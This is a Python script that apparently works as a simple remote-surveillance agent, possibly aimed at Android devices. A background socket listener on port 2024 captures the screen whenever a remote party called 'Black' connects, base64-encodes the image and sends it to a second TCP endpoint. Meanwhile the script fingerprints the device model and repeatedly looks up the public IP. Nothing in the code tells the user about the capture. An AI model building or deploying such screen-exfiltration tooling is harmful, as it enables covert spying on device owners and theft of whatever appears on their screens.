import socket
import requests
import time
import platform
import subprocess
from bs4 import BeautifulSoup
import mss
import base64
from io import BytesIO
from PIL import Image

ZAMASOU_IP = "127.0.0.1"
ZAMASOU_PORT = 2024

def capture_screen():
    try:
        with mss.mss() as sct:
            screenshot = sct.shot()
            img = Image.open(BytesIO(screenshot))
            buffered = BytesIO()
            img.save(buffered, format="PNG")
            return base64.b64encode(buffered.getvalue()).decode('utf-8')
    except Exception as e:
        print(f"Error occurred while capturing screen: {e}")
        return None

def send_screenshot(ip, port, screenshot):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            s.sendall(screenshot.encode())
            print("Screenshot sent successfully!")
    except Exception as e:
        print(f"Error occurred while sending screenshot: {e}")

def get_ip_info():
    try:
        response = requests.get("http://ipinfo.io/json")
        data = response.json()
        ip_address = data.get("ip")
        return ip_address
    except Exception as e:
        print(f"Error occurred: {e}")
        return None

def get_device_name():
    try:
        device_name = platform.node()
        if device_name == "localhost" or not device_name:
            device_name = socket.gethostname()

        if "localhost" in device_name or not device_name:
            try:
                model = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True).stdout.strip()
                manufacturer = subprocess.run(['getprop', 'ro.product.manufacturer'], capture_output=True, text=True).stdout.strip()
                search_query = f"{manufacturer} {model}"
                device_name = fetch_device_name_from_google(search_query)
            except Exception as e:
                print(f"Error occurred while fetching device name using subprocess: {e}")
                device_name = "Unknown Device"
        return device_name
    except Exception as e:
        print(f"Error occurred while fetching device name: {e}")
        return "Unknown Device"

def fetch_device_name_from_google(query):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
        search_url = f"https://www.google.com/search?q={query.replace(' ', '+')}"
        response = requests.get(search_url, headers=headers)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        first_result = soup.find('h3')
        
        if first_result:
            device_name = first_result.text.split(' - ')[0]
            return device_name
        else:
            return query
    except Exception as e:
        print(f"Error occurred while searching on Google: {e}")
        return query

def start_server():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((ZAMASOU_IP, ZAMASOU_PORT))
            s.listen(1)
            print(f"Server running on {ZAMASOU_IP}:{ZAMASOU_PORT}")

            while True:
                client_socket, client_address = s.accept()
                with client_socket:
                    print(f"Incoming connection from {client_address}")
                    message = client_socket.recv(1024).decode()
                    print(f"Received from Black: {message}")
                    
                    # Capture screenshot
                    screenshot = capture_screen()
                    if screenshot:
                        send_screenshot("127.0.0.1", 2007, screenshot)
    except Exception as e:
        print(f"Error occurred in server: {e}")

def main():
    print(f"Local IP address: {ZAMASOU_IP}, Port: {ZAMASOU_PORT}")
    
    from threading import Thread
    server_thread = Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

    device_name = get_device_name()

    while True:
        ip = get_ip_info()
        if ip:
            print(f"Public IP address: {ip}, Device Name: {device_name}")
        else:
            print(f"Failed to retrieve IP information, Device Name: {device_name}")
        time.sleep(10)

if __name__ == "__main__":
    main()